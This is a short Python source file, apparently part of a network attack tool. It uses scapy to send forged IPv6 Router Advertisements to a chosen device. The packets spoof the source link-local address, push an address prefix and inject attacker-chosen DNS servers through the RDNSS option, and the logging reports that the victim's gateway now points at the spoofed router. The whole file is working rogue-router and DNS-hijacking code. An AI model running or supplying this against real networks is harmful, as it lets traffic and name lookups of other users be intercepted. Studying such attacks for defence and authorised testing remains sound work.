from scapy.all import *
from scapy.layers.inet6 import ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, IPv6, ICMPv6NDOptRDNSS
from scapy.layers.l2 import Ether

from config import PREFIX, IFACE
def send_ra(dst_mac, dst_lla, src_mac, src_lla,dns: List[str], router_lifetime=300, real_mac=None):
    if not dst_mac:
        print(f"[-] 向 {dst_mac}  发送 RA 失败，未能找到设备的ipv6")
    # 构造以太网头
    eth = Ether(src=real_mac, dst=dst_mac)
    print(eth)
    # 构造IPv6头：伪造源LLA
    ip6 = IPv6(src=src_lla, dst=dst_lla)
    # 构造RA报文
    ra = ICMPv6ND_RA(chlim=64, M=0, O=0)
    # 构造前缀信息
    pref = ICMPv6NDOptPrefixInfo(
        prefix=PREFIX,
        prefixlen=64,
        L=1, #链路内标志
        A=1, #自主地址配置标志
        validlifetime=router_lifetime,
        preferredlifetime=router_lifetime
    )
    sll = ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    rdnss = ICMPv6NDOptRDNSS(dns=dns, lifetime=router_lifetime)
    pkt = eth / ip6 / ra / pref / sll / rdnss
    sendp(pkt, iface=IFACE, verbose=False)
    print(f"[+] 已向 {dst_mac} ({dst_lla}) 发送 RA，网关指向 {src_lla}，DNS为{dns}")